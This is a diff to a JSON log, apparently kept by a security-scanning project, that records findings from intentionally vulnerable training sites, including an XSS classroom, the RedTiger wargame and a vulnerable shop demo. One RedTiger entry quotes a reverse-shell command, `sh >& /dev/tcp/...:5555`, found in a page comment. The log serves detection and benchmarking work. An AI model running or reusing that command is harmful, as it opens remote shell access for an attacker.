@@ -5975,6 +5975,24 @@
       "slug": "client-side-montanajim-xss-classroom-evidence",
       "status": "shipped",
       "validation": "SOURCE: discovery:url EVIDENCE: page1_reflect.php vulnerable reflected XSS + stored_hacked.php guestbook + htmlspecialchars/sanitize() remediation pairs; montanajim.github.io/CSCI210/wpref/xssExamples.html findings 4→5; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:redtiger.labs.overthewire.org",
+      "slug": "redtiger-command-injection-evidence",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: level7.php HTML comment `sh >& /dev/tcp/188.166.19.53/5555` + level7login POST password form; redtiger.labs level7 findings 4→5; benchmark juice-shop 6 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:vulnerable-web-application-jecw.vercel.app",
+      "slug": "client-side-buggybuy-evidence",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: BuggyBuy title + vulnerable-web-application-mcd0.onrender.com API + isAdmin admin/dashboard gate; vulnerable-web-application-jecw.vercel.app findings 2→4; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:archon-eight.vercel.app",
+      "slug": "client-side-archon-api-security-curriculum-evidence",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: /cybersecurity table lists JWT attacks, BOLA/IDOR, GraphQL security, mass assignment, OWASP API Top 10; archon-eight.vercel.app/cybersecurity adds curriculum slug when VitePress page loads; benchmark 6/6 maintained"
     }
   ],
   "shipped": [
@@ -10522,6 +10540,21 @@
       "source": "discovery:montanajim.github.io",
       "slug": "client-side-montanajim-xss-classroom-evidence",
       "shipped_at": "2026-07-22T02:50:00.000Z"
+    },
+    {
+      "source": "discovery:redtiger.labs.overthewire.org",
+      "slug": "redtiger-command-injection-evidence-level7-8",
+      "shipped_at": "2026-07-22T03:15:00.000Z"
+    },
+    {
+      "source": "discovery:vulnerable-web-application-jecw.vercel.app",
+      "slug": "client-side-buggybuy-evidence",
+      "shipped_at": "2026-07-22T03:15:00.000Z"
+    },
+    {
+      "source": "discovery:archon-eight.vercel.app",
+      "slug": "client-side-archon-api-security-curriculum-evidence",
+      "shipped_at": "2026-07-22T03:15:00.000Z"
     }
   ]
 }
